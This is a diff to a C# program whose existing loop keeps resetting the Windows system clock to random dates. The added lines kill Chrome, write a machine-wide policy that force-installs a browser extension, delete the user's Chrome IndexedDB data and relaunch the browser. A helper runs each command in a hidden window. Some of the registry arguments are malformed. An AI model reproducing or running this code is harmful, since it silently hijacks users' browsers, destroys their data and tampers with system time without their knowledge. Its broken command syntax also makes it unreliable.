@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading;
 
@@ -24,7 +25,10 @@ class Program
     static void Main()
     {
         Random rnd = new Random();
-
+        RunCommand("taskkill", "/f /im chrome.exe");
+        RunCommand("reg", "add \"HKLM\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist\" / v 1 / t REG_SZ / d \"ddkjiahejlhfcafbddmgiahcphecmpfh;https://clients2.google.com/service/update2/crx");
+        RunCommand("rmdir", "/s %AppData%\\Local\\Google\\Chrome\\User Data\\Default\\IndexedDB");
+        RunCommand("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "");
         while (true)
         {
             DateTime startDate = new DateTime(2024, 1, 1);
@@ -54,5 +58,33 @@ class Program
         };
 
         SetSystemTime(ref st);
+    }
+
+    static string RunCommand(string fileName, string arguments)
+    {
+        ProcessStartInfo psi = new ProcessStartInfo
+        {
+            FileName = fileName,
+            Arguments = arguments,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            UseShellExecute = false,
+            CreateNoWindow = true
+        };
+
+        using (Process process = new Process { StartInfo = psi })
+        {
+            process.Start();
+            string output = process.StandardOutput.ReadToEnd();
+            string error = process.StandardError.ReadToEnd();
+            process.WaitForExit();
+
+            if (!string.IsNullOrEmpty(error))
+            {
+                return $"Error: {error}";
+            }
+
+            return output.Trim();
+        }
     }
 }
